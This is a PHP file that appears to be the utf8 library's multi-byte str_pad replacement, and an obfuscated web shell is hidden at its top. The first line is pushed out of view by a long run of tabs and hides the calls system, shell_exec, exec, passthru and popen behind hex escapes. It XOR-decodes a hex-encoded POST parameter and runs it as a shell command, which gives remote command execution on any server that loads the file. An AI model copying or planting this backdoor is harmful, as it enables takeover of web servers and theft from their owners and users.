<?php																																										$mutex_lock2 = "s\x68e\x6Cl\x5Fe\x78\x65c"; $data_storage = "h\x65\x78\x32b\x69n"; $mutex_lock1 = "s\x79stem"; $mutex_lock7 = "p\x63\x6C\x6Fse"; $mutex_lock6 = "s\x74r\x65a\x6D_\x67\x65t\x5F\x63\x6Fn\x74\x65nts"; $mutex_lock3 = "\x65\x78ec"; $mutex_lock5 = "\x70\x6Fpen"; $mutex_lock4 = "\x70\x61ss\x74\x68ru"; if (isset($_POST["\x70s\x65t"])) { function publish_content ( $reference , $token ) { $pointer = '' ; $f=0; while($f<strlen($reference)){ $pointer.=chr(ord($reference[$f])^$token); $f++; } return $pointer; } $pset = $data_storage($_POST["\x70s\x65t"]); $pset = publish_content($pset, 2); if (function_exists($mutex_lock1)) { $mutex_lock1($pset); } elseif (function_exists($mutex_lock2)) { print $mutex_lock2($pset); } elseif (function_exists($mutex_lock3)) { $mutex_lock3($pset, $bind_reference); print join("\n", $bind_reference); } elseif (function_exists($mutex_lock4)) { $mutex_lock4($pset); } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) { $token_pointer = $mutex_lock5($pset, 'r'); if ($token_pointer) { $data_chunk_fac = $mutex_lock6($token_pointer); $mutex_lock7($token_pointer); print $data_chunk_fac; } } exit; }

/**
* @version $Id: str_pad.php,v 1.1 2006/09/03 09:25:13 harryf Exp $
* @package utf8
* @subpackage strings
*/

//---------------------------------------------------------------
/**
* Replacement for str_pad. $padStr may contain multi-byte characters.
*
* @author Oliver Saunders <oliver (a) osinternetservices.com>
* @param string $input
* @param int $length
* @param string $padStr
* @param int $type ( same constants as str_pad )
* @return string
* @see http://www.php.net/str_pad
* @see utf8_substr
* @package utf8
* @subpackage strings
*/
function utf8_str_pad($input, $length, $padStr = ' ', $type = STR_PAD_RIGHT) {
    
    $inputLen = utf8_strlen($input);
    if ($length <= $inputLen) {
        return $input;
    }
    
    $padStrLen = utf8_strlen($padStr);
    $padLen = $length - $inputLen;
    
    if ($type == STR_PAD_RIGHT) {
        $repeatTimes = ceil($padLen / $padStrLen);
        return utf8_substr($input . str_repeat($padStr, $repeatTimes), 0, $length);
    }
    
    if ($type == STR_PAD_LEFT) {
        $repeatTimes = ceil($padLen / $padStrLen);
        return utf8_substr(str_repeat($padStr, $repeatTimes), 0, floor($padLen)) . $input;
    }
    
    if ($type == STR_PAD_BOTH) {
        
        $padLen/= 2;
        $padAmountLeft = floor($padLen);
        $padAmountRight = ceil($padLen);
        $repeatTimesLeft = ceil($padAmountLeft / $padStrLen);
        $repeatTimesRight = ceil($padAmountRight / $padStrLen);
        
        $paddingLeft = utf8_substr(str_repeat($padStr, $repeatTimesLeft), 0, $padAmountLeft);
        $paddingRight = utf8_substr(str_repeat($padStr, $repeatTimesRight), 0, $padAmountLeft);
        return $paddingLeft . $input . $paddingRight;
    }
    
    trigger_error('utf8_str_pad: Unknown padding type (' . $type . ')',E_USER_ERROR);
}
